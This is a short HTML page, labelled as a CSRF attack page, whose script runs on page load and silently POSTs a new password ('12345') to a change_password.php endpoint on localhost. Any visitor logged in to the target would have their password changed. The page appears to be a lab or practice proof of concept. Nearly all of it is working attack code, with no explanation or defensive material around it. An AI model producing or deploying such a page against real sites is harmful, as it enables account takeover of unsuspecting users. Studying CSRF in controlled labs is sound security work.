<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Attack Page</title>
</head>
<body>
    <h1>Welcome to the CSRF Attack Page</h1>
    <p>If you are logged in to the target site, your password will be changed.</p>

    <script>
        window.onload = function() {
            // Create the data to be sent
            var data = new FormData();
            data.append("new_password", "12345"); // รหัสผ่านใหม่ที่ต้องการเปลี่ยน
            data.append("confirm_password", "12345"); // ยืนยันรหัสผ่านใหม่
            data.append("submit", "submit");

            // Create and configure the request
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "http://localhost:8001/change_password.php", true);
            
            // Optional: Set any custom headers if required
            // xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    console.log(xhr.responseText);
                }
            };

            // Send the request
            xhr.send(data);
        }
    </script>
</body>
</html>